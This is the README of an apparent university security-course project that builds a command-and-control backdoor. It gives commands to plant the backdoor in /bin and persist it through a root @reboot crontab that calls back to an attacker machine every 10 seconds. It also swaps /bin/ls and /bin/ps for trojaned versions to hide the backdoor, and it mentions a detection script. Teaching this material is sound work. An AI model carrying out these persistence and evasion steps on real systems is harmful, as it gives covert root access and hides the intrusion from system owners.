# C S 378 - Command and Control Project (Donald and Vincent)

## Set Up

### Configure IP (IMPORTANT)

Edit the IP addresses in the **_config.py_** file to match the IP address of the attacker machine. Can also set which port number the attacker machine will use to listen.

### Creating executables (IMPORTANT)

To create the attacker and backdoor executable things, run the make file. One file named 'attacker'
and another file named 'backdoor' should be created.

This must be done for the configured IP to work.

### Setting Up and Running Backdoor 

#### Installing necessary packages (on week 4)

Run the following commands as root on the week 4 machine:

sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*

sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*

sudo yum install -y python3

python3 -m pip install pexpect

python3 -m pip install -U pip setuptools

python3 -m pip install cryptography

#### Creating reboot cronjob 

Place the 'backdoor' executable in the /bin directory of the target machine.

Run **_chmod 755 backdoor_** to give execute permissions.

Run the command **_sudo crontab -e_**

Scroll to the bottom (after all #) and add the line: **_@reboot python3 /bin/backdoor &_**

Reboot the system (**_sudo reboot_**), cronjob should run every restart. Backdoor should call out
to attacker machine every 10 seconds (can edit this amount of time in **_config.py_**).

### Setting Up Detection Evasion

#### ls

In the evasion_and_detection folder, there is an **_ls_custom_** file. Take that and put it into the target machine in the **_/bin_** directory.

Update **_ls_custom_** permissions by running: **_chmod 755 /bin/ls_custom_**

If not already created, run ***mkdir /bin/orig*** to create a directory named **_orig_** in the **_/bin_** directory.

Run **_mv /bin/ls /bin/orig_** to place the original **_ls_** file from the **_/bin_** directory into the **_/bin/orig_** directory.

Run ***mv ls_custom ls*** to rename the ***ls_custom*** file to **_ls_**


#### ps

Place the ***fake_ps*** file found in the evasion_and_detection folder into the **_/bin_** directory of the target machine

Run ***chmod 755 fake_ps*** to set permissions.

If not already created, run ***mkdir /bin/orig*** to create a directory named **_orig_** in the **_/bin_** directory.

Run **_mv /bin/ps /bin/orig_** to place the original **_ps_** file from the **_/bin_** directory into the **_/bin/orig_** directory.

Run ***mv fake_ps ps*** to rename the ***fake_ps*** file to **_ps_**

### Setting Up and Running Attacker

Place the 'attacker' executable on the attack machine.

Run **_chmod +x attacker_** to give execute permissions.

Run **_./attacker_** in the command line to run the file and wait for the connection to be initiated by the target machine.

Once connection is made, we should be running as the root user and we are initially placed in root's directory

### BONUS: Detection Script

In the evasion_and_detection folder, there is an **_detect.py_** file. To run it, put it into the target machine and execute it using the following command: **_python3 detect.py file_to_check_**. The argument is to specify the name of the file you want to check for the malicious string **_backdoor_**, which in this case is **_/bin/ls_** and **_/bin/ps_**.